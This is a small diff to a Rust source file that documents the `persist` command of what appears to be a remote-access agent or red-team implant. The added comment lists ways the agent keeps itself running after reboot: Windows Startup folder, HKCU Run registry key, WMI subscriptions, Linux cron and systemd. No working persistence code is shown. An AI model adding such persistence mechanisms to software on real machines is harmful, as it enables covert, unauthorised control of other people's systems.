@@ -6,7 +6,18 @@ use std::error::Error;
 #[cfg(windows)] use std::fs::copy as fs_copy;
 #[cfg(windows)] use winreg::enums::HKEY_CURRENT_USER;
 
-
+/// Uses the specified method to establish persistence. 
+/// 
+/// ### Windows Options
+/// 
+/// * `startup`: Copies the agent to the Startup Programs folder.
+/// * `registry`: Copies the agent to `%LOCALAPPDATA%` and writes a value to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
+/// * `wmic`: Establishes persistences via WMI subscriptions.
+/// 
+/// ### Linux Options
+/// 
+/// * `cron`: Writes a cronjob to the user's crontab and saves the agent in the home folder
+/// * `systemd`: Creates a systemd service and writes the binary someplace special
 pub async fn handle(s: &String) -> Result<String, Box<dyn Error>> {
     // `persist [method] [args]`
     #[cfg(windows)] {
